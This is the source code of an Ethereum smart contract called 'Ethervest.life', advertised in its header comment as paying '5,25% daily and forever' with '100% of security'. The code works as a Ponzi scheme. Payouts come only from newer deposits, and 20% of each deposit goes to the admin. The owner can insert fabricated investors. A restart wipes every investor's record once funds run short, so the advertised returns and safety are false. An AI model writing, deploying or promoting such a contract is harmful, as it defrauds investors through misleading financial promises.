1 pragma solidity ^0.4.24;
2 
3 /**
4  *
5  * Ethervest.life
6  *  - GAIN 5,25% DAILY AND FOREVER (every 5900 blocks)
7  *  – MIN INVESTMENT 0.01 ETH
8  *  – 100% OF SECURITY
9  *
10  * RECOMMENDED GAS LIMIT: 250000
11  * RECOMMENDED GAS PRICE: https://ethgasstation.info/
12  *
13  *
14  */
15 
16 contract EthervestLIFE {
17     address public owner;
18     address public adminAddr;
19     uint constant public MASS_TRANSACTION_LIMIT = 150;
20     uint constant public MINIMUM_INVEST = 10000000000000000 wei;
21     uint public depositAmount;
22     uint public round;
23     uint public lastPaymentDate;
24     address[] public addresses;
25     mapping(address => Investor) public investors;
26     bool public pause;
27 
28     struct Investor
29     {
30         uint id;
31         uint deposit;
32         uint deposits;
33         uint date;
34         address referrer;
35     }
36 
37 
38     event Invest(address addr, uint amount, address referrer);
39     event Payout(address addr, uint amount, string eventType, address from);
40     event NextRoundStarted(uint round, uint date, uint deposit);
41 
42     modifier onlyOwner {if (msg.sender == owner) _;}
43 
44     constructor() public {
45         owner = msg.sender;
46         adminAddr = msg.sender;
47         addresses.length = 1;
48         round = 1;
49     }
50 
51     function transferOwnership(address addr) onlyOwner public {
52         owner = addr;
53     }
54 
55     function addInvestors(address[] _addr, uint[] _deposit, uint[] _date, address[] _referrer) onlyOwner public {
56         // add initiated investors
57         for (uint i = 0; i < _addr.length; i++) {
58             uint id = addresses.length;
59             if (investors[_addr[i]].deposit == 0) {
60                 addresses.push(_addr[i]);
61                 depositAmount += _deposit[i];
62             }
63 
64             investors[_addr[i]] = Investor(id, _deposit[i], 1, _date[i], _referrer[i]);
65             emit Invest(_addr[i], _deposit  [i], _referrer[i]);
66 
67         }
68         lastPaymentDate = now;
69     }
70 
71     function() payable public {
72         if (owner == msg.sender) {
73             return;
74         }
75 
76         if (0 == msg.value) {
77             payoutSelf();
78             return;
79         }
80 
81         require(false == pause, "Ethervest is restarting. Please wait.");
82         require(msg.value >= MINIMUM_INVEST, "Too small amount, minimum 0.01 ether");
83         Investor storage user = investors[msg.sender];
84 
85         if (user.id == 0) {
86             // ensure that payment not from hacker contract
87             msg.sender.transfer(0 wei);
88             addresses.push(msg.sender);
89             user.id = addresses.length;
90             user.date = now;
91 
92             // referrer
93             address referrer = bytesToAddress(msg.data);
94             if (investors[referrer].deposit > 0 && referrer != msg.sender) {
95                 user.referrer = referrer;
96             }
97         } else {
98             payoutSelf();
99         }
100 
101         // save investor
102         user.deposit += msg.value;
103         user.deposits += 1;
104 
105         emit Invest(msg.sender, msg.value, user.referrer);
106 
107         depositAmount += msg.value;
108         lastPaymentDate = now;
109 
110         adminAddr.transfer(msg.value / 5); // project fee
111         uint bonusAmount = (msg.value / 100) * 3; // referrer commission for all deposits
112 
113         if (user.referrer > 0x0) {
114             if (user.referrer.send(bonusAmount)) {
115                 emit Payout(user.referrer, bonusAmount, "referral", msg.sender);
116             }
117 
118             if (user.deposits == 1) { // cashback only for the first deposit
119                 if (msg.sender.send(bonusAmount)) {
120                     emit Payout(msg.sender, bonusAmount, "cash-back", 0);
121                 }
122             }
123         }
124     }
125 
126     function payout(uint offset) public
127     {
128         if (pause == true) {
129             doRestart();
130             return;
131         }
132 
133         uint txs;
134         uint amount;
135 
136         for (uint idx = addresses.length - offset - 1; idx >= 1 && txs < MASS_TRANSACTION_LIMIT; idx--) {
137             address addr = addresses[idx];
138             if (investors[addr].date + 20 hours > now) {
139                 continue;
140             }
141 
142             amount = getInvestorDividendsAmount(addr);
143             investors[addr].date = now;
144 
145             if (address(this).balance < amount) {
146                 pause = true;
147                 return;
148             }
149 
150             if (addr.send(amount)) {
151                 emit Payout(addr, amount, "bulk-payout", 0);
152             }
153 
154             txs++;
155         }
156     }
157 
158     function payoutSelf() private {
159         require(investors[msg.sender].id > 0, "Investor not found.");
160         uint amount = getInvestorDividendsAmount(msg.sender);
161 
162         investors[msg.sender].date = now;
163         if (address(this).balance < amount) {
164             pause = true;
165             return;
166         }
167 
168         msg.sender.transfer(amount);
169         emit Payout(msg.sender, amount, "self-payout", 0);
170     }
171 
172     function doRestart() private {
173         uint txs;
174         address addr;
175 
176         for (uint i = addresses.length - 1; i > 0; i--) {
177             addr = addresses[i];
178             addresses.length -= 1;
179             delete investors[addr];
180             if (txs++ == MASS_TRANSACTION_LIMIT) {
181                 return;
182             }
183         }
184 
185         emit NextRoundStarted(round, now, depositAmount);
186         pause = false;
187         round += 1;
188         depositAmount = 0;
189         lastPaymentDate = now;
190 
191     }
192 
193     function getInvestorCount() public view returns (uint) {
194         return addresses.length - 1;
195     }
196 
197     function getInvestorDividendsAmount(address addr) public view returns (uint) {
198         return investors[addr].deposit / 10000 * 525 * (now - investors[addr].date) / 1 days;
199     }
200 
201     function bytesToAddress(bytes bys) private pure returns (address addr) {
202         assembly {
203             addr := mload(add(bys, 20))
204         }
205     }
206 }